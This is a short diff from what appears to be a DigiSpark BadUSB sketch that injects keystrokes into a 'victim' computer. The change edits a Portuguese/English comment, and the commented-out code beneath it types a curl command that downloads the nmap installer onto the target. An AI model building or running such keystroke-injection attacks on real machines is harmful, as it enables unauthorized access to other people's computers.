@@ -12,7 +12,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER); 
   DigiKeyboard.delay(2000); 
   
-  // DESCOMENTE CASO A VITIMA TENHA O NMAP INSTALADO || UNCOMMENT IF THE VICTIM HAS NMAP INSTALLED
+  // DESCOMENTE CASO A VITIMA NÃO TENHA O NMAP INSTALADO || UNCOMMENT IF THE VICTIM HASN'T NMAP INSTALLED
   /*DigiKeyboard.print("curl -O https://nmap.org/dist/nmap-7.95-setup.exe");
   DigiKeyboard.sendKeyStroke(KEY_ENTER); 
   DigiKeyboard.delay(19000);
